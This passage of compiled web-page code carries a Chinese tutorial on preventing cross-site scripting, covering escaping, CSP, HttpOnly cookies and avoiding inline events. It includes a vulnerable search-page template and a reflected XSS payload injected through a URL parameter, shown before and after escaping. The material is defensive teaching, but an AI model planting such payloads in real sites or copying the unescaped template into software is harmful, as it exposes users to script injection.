"),n("li",[t._v("劫持用户Web行为，甚至进一步渗透内网。")]),t._v(" "),n("li",[t._v("删除目标文章、恶意篡改数据、嫁祸。")]),t._v(" "),n("li",[t._v("蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据")]),t._v(" "),n("li",[t._v("蠕虫式的DDoS攻击。")])]),t._v(" "),n("h2",{attrs:{id:"_3-防范手段"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-防范手段"}},[t._v("#")]),t._v(" 3. 防范手段")]),t._v(" "),n("h3",{attrs:{id:"_3-1-两大要素"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-1-两大要素"}},[t._v("#")]),t._v(" 3.1 两大要素")]),t._v(" "),n("p",[t._v("XSS 攻击有两大要素：")]),t._v(" "),n("ol",[n("li",[t._v("攻击者提交恶意代码(输入过滤)。")]),t._v(" "),n("li",[t._v("浏览器执行恶意代码。")])]),t._v(" "),n("p",[n("strong",[t._v("xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。")])]),t._v(" "),n("h3",{attrs:{id:"_3-2-预防方案"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-预防方案"}},[t._v("#")]),t._v(" 3.2 预防方案")]),t._v(" "),n("h4",{attrs:{id:"_3-2-1-输入过滤"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-1-输入过滤"}},[t._v("#")]),t._v(" 3.2.1 输入过滤")]),t._v(" "),n("ul",[n("li",[t._v("对输入的内容诸如"),n("code",[t._v("<script>、<img>、<a>")]),t._v("等标签进行过滤")]),t._v(" "),n("li",[t._v("其次是编码。像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。")])]),t._v(" "),n("h4",{attrs:{id:"_3-2-2-预防存储型和反射型-xss-攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-2-预防存储型和反射型-xss-攻击"}},[t._v("#")]),t._v(" 3.2.2 预防存储型和反射型 Xss 攻击")]),t._v(" "),n("p",[t._v("预防这两种漏洞，有两种常见做法：")]),t._v(" "),n("ul",[n("li",[t._v("改成纯前端渲染，把代码和数据分隔开。")]),t._v(" "),n("li",[t._v("对 HTML 做充分转义。")])]),t._v(" "),n("h5",{attrs:{id:"_3-2-2-1-纯前端渲染"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-2-1-纯前端渲染"}},[t._v("#")]),t._v(" 3.2.2.1 纯前端渲染")]),t._v(" "),n("p",[t._v("纯前端渲染的过程：")]),t._v(" "),n("ol",[n("li",[t._v("浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。")]),t._v(" "),n("li",[t._v("然后浏览器执行 HTML 中的 JavaScript。")]),t._v(" "),n("li",[t._v("JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。")])]),t._v(" "),n("h5",{attrs:{id:"_3-2-2-2-转义-html"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-2-2-转义-html"}},[t._v("#")]),t._v(" 3.2.2.2 转义 HTML")]),t._v(" "),n("p",[t._v("如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。")]),t._v(" "),n("p",[t._v("对于 HTML 转义通常只有一个规则，就是把 "),n("code",[t._v("& < > \" ' /")]),t._v(" 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：")]),t._v(" "),n("p",[t._v("所以要完善 Xss 防护措施，我们要使用更完善更细致的转义策略。")]),t._v(" "),n("p",[t._v("例如 Java 工程里，常用的转义库为 "),n("code",[t._v("org.owasp.encoder")])]),t._v(" "),n("h4",{attrs:{id:"_3-2-3-输入内容长度控制"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-3-输入内容长度控制"}},[t._v("#")]),t._v(" 3.2.3 输入内容长度控制")]),t._v(" "),n("p",[t._v("对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 Xss 发生，但可以增加 Xss 攻击的难度。")]),t._v(" "),n("p",[t._v("对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。")]),t._v(" "),n("h4",{attrs:{id:"_3-2-4-cookie的安全设置"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-4-cookie的安全设置"}},[t._v("#")]),t._v(" 3.2.4 Cookie的安全设置")]),t._v(" "),n("ul",[n("li",[t._v("HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。\n"),n("ul",[n("li",[n("strong",[t._v("http-only:")]),t._v(" 只允许http或https请求读取cookie、JS代码是无法读取cookie的(document.cookie会显示http-only的cookie项被自动过滤掉)。发送请求时自动发送cookie.")]),t._v(" "),n("li",[n("strong",[t._v("secure-only:")]),t._v(" 只允许https请求读取，发送请求时自动发送cookie。")]),t._v(" "),n("li",[n("strong",[t._v("host-only:")]),t._v(" 只允许主机域名与domain设置完成一致的网站才能访问该cookie。")])])])]),t._v(" "),n("h4",{attrs:{id:"_3-2-5-安全验证"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-5-安全验证"}},[t._v("#")]),t._v(" 3.2.5 安全验证")]),t._v(" "),n("ul",[n("li",[t._v("验证码：防止脚本冒充用户提交危险操作。")])]),t._v(" "),n("h4",{attrs:{id:"_3-2-6-开启csp网页安全政策"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-6-开启csp网页安全政策"}},[t._v("#")]),t._v(" 3.2.6 开启CSP网页安全政策")]),t._v(" "),n("p",[t._v("Content-Security-Policy 中文的意思是 网页安全政策，")]),t._v(" "),n("p",[t._v("CSP是网页安全政策(Content Security Policy)的缩写。主要用来防止Xss攻击。是一种由开发者定义的安全性政策申明，通过CSP所约束的责任指定可信的内容来源，通过 Content-Security-Policy 网页的开发者可以控制整个页面中 外部资源 的加载和执行。\n比如可以控制哪些 域名下的静态资源可以被页面加载，哪些不能被加载。这样就可以很大程度的防范了 来自 跨站(域名不同) 的脚本攻击")]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[t._v("我们只需要在meta属性中设置下即可：如下代码：\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("meta")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("http-equiv")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("Content-Security-Policy"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("content")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("\ndefault-src http: https:  *.xxx.com "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("self"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("unsafe-inline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(" ;\nstyle-src "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("self"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("unsafe-inline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(" *.yyy.com;\nscript-src "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("self"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("unsafe-inline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v("unsafe-eval"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(" ;\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br")])]),n("ul",[n("li",[t._v("default-src 给下面所有的规则设定一个默认值")]),t._v(" "),n("li",[t._v("script-src 外部脚本")]),t._v(" "),n("li",[t._v("style-src 样式表")]),t._v(" "),n("li",[t._v("img-src 图像")]),t._v(" "),n("li",[t._v("media-src 媒体文件（音频和视频）")]),t._v(" "),n("li",[t._v("font-src 字体文件")]),t._v(" "),n("li",[t._v("object-src 插件（比如 Flash）")]),t._v(" "),n("li",[t._v("child-src 框架")])]),t._v(" "),n("h4",{attrs:{id:"_3-2-7-避免内联事件"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-7-避免内联事件"}},[t._v("#")]),t._v(" 3.2.7 避免内联事件")]),t._v(" "),n("p",[n("strong",[t._v("避免内联事件")]),t._v(" 尽量不要使用 "),n("code",[t._v("onLoad=\"onload('"+t._s(t.data)+"')\"")]),t._v("、"),n("code",[t._v("onClick=\"go('"+t._s(t.action)+"')\"")]),t._v(" 这种拼接内联事件的写法。在 JavaScript 中通过 "),n("code",[t._v(".addEventlistener()")]),t._v(" 事件绑定会更安全。")]),t._v(" "),n("h2",{attrs:{id:"_4-总结"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_4-总结"}},[t._v("#")]),t._v(" 4. 总结")]),t._v(" "),n("p",[t._v("整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。")]),t._v(" "),n("p",[t._v("虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生：")]),t._v(" "),n("ul",[n("li",[n("strong",[t._v("利用模板引擎")]),t._v(" 开启模板引擎自带的 HTML 转义功能。例如： 在 ejs 中，尽量使用 "),n("code",[t._v("<%= data %>")]),t._v(" 而不是 "),n("code",[t._v("<%- data %>")]),t._v("； 在 doT.js 中，尽量使用 "),n("code",[t._v("{{! data }")]),t._v(" 而不是 "),n("code",[t._v("{{= data }")]),t._v("； 在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 "),n("code",[t._v("freemarker.core.OutputFormat")]),t._v("。")]),t._v(" "),n("li",[n("strong",[t._v("避免内联事件")]),t._v(" 尽量不要使用 "),n("code",[t._v("onLoad=\"onload('"+t._s(t.data)+"')\"")]),t._v("、"),n("code",[t._v("onClick=\"go('"+t._s(t.action)+"')\"")]),t._v(" 这种拼接内联事件的写法。在 JavaScript 中通过 "),n("code",[t._v(".addEventlistener()")]),t._v(" 事件绑定会更安全。")]),t._v(" "),n("li",[n("strong",[t._v("避免拼接 HTML")]),t._v(" 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 "),n("code",[t._v("createElement")]),t._v("、"),n("code",[t._v("setAttribute")]),t._v(" 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。")]),t._v(" "),n("li",[n("strong",[t._v("时刻保持警惕")]),t._v(" 在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。")]),t._v(" "),n("li",[n("strong",[t._v("增加攻击难度，降低攻击后果")]),t._v(" 通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。")]),t._v(" "),n("li",[n("strong",[t._v("主动检测和发现")]),t._v(" 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。")])]),t._v(" "),n("h2",{attrs:{id:"_5-真实场景-搜索场景"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_5-真实场景-搜索场景"}},[t._v("#")]),t._v(" 5. 真实场景(搜索场景)")]),t._v(" "),n("p",[t._v("某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容")]),t._v(" "),n("h3",{attrs:{id:"_1-原始版本"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1-原始版本"}},[t._v("#")]),t._v(" 1. 原始版本")]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("<%= getParameter("),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v('keyword")')]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("%")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('">\n'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("搜索"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('\n  您搜索的关键词是：<%= getParameter("keyword") %>\n'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("p",[t._v("当执行 "),n("code",[t._v("http://xxx/search?keyword=\"><script>alert('XSS');<\/script>")]),t._v("，服务端会解析出请求参数 "),n("code",[t._v("keyword")]),t._v("，得到 "),n("code",[t._v("\"><script>alert('XSS');<\/script>")]),t._v("，拼接到 HTML 中返回给浏览器,页面就出现如下内容，"),n("strong",[t._v("alert 会弹出两次")]),t._v("。")]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),n("span",{pre:!0,attrs:{class:"token script"}},[n("span",{pre:!0,attrs:{class:"token language-javascript"}},[n("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'XSS'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")])])]),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('">\n'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("搜索"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('\n  您搜索的关键词是：">'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),n("span",{pre:!0,attrs:{class:"token script"}},[n("span",{pre:!0,attrs:{class:"token language-javascript"}},[n("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'XSS'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")])])]),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("h3",{attrs:{id:"_2-xss的转义攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_2-xss的转义攻击"}},[t._v("#")]),t._v(" 2. Xss的转义攻击")]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("<%= escapeHTML(getParameter("),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v('keyword"))')]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("%")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('">\n'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("搜索"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('\n  您搜索的关键词是：<%= escapeHTML(getParameter("keyword")) %>\n'),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("p",[n("code",[t._v("escapeHTML()")]),t._v(" 按照如下规则进行转义：|字符|转义后的字符| |-|-| |"),n("code",[t._v("&")]),t._v("|"),n("code",[t._v("&")]),t._v("| |"),n("code",[t._v("<")]),t._v("|"),n("code",[t._v("<")]),t._v("| |"),n("code",[t._v(">")]),t._v("|"),n("code",[t._v(">")]),t._v("| |"),n("code",[t._v('"')]),t._v("|"),n("code",[t._v('"')]),t._v("| |"),n("code",[t._v("'")]),t._v("|"),n("code",[t._v("'")]),t._v("| |"),n("code",[t._v("/")]),t._v("|"),n("code",[t._v("/")]),t._v("|")]),t._v(" "),n("p",[t._v("经过了转义函数的处理后，最终浏览器接收到的响应为：")]),t._v(" "),n("div",{staticClass:"language-html line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-html"}},[n("code",[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),n("span",{pre:!0,attrs:{class:"token attr-value"}},[n("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:'"'}},[t._v("&quot;")]),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:">"}},[t._v("&gt;")]),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:"<"}},[t._v("&lt;")]),t._v("script"),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:">"}},[t._v("&gt;")]),t._v("alert("),n("span",{pre:!0,attrs:{class:"token entity",title:"&#x27;"}},[t._v("&#x27;")]),t._v("XSS"),n("span",{pre:!0,attrs:{class:"token entity",title:"&#x27;"}},[t._v("&#x27;")]),t._v(");"),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:"<"}},[t._v("&lt;")]),n("span",{pre:!0,attrs:{class:"token entity",title:"&#x2F;"}},[t._v("&#x2F;")]),t._v("script"),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:">"}},[t._v("&gt;")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("搜索"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("button")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  您搜索的关键词是："),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:'"'}},[t._v("&quot;")]),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:">"}},[t._v("&gt;")]),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:"<"}},[t._v("&lt;")]),t._v("script"),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:">"}},[t._v("&gt;")]),t._v("alert("),n("span",{pre:!0,attrs:{class:"token entity",title:"&#x27;"}},[t._v("&#x27;")]),t._v("XSS"),n("span",{pre:!0,attrs:{class:"token entity",title:"&#x27;"}},[t._v("&#x27;")]),t._v(");"),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:"<"}},[t._v("&lt;")]),n("span",{pre:!0,attrs:{class:"token entity",title:"&#x2F;"}},[t._v("&#x2F;")]),t._v("script"),n("span",{pre:!0,attrs:{class:"token entity named-entity",title:">"}},[t._v("&gt;")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token tag"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("h3",{attrs:{id:"小结论"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#小结论"}},[t._v("#")]),t._v(" 小结论")]),t._v(" "),n("ul",[n("li",[t._v("通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。")]),t._v(" "),n("li",[t._v("攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。")]),t._v(" "),n("li",[t._v("攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。")]),t._v(" "),n("li",[n("strong",[t._v("通过 HTML 转义，可以防止 